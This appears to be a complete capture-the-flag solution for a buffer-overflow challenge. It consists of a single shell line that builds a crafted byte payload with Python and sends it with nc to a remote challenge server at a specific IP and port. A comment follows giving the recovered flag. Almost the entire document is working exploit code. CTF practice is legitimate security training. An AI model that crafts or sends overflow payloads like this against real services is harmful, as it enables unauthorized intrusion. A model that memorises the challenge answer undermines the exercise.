python -c 'print("\x01" * 4 + "\x9c" + "\x01" * 41 + "\n238\n")' | nc 20.51.215.194 7331 | grep -o "ictf{.*}"
# ictf{an_1C3_c0ld_buff3r_0v3rfl0w}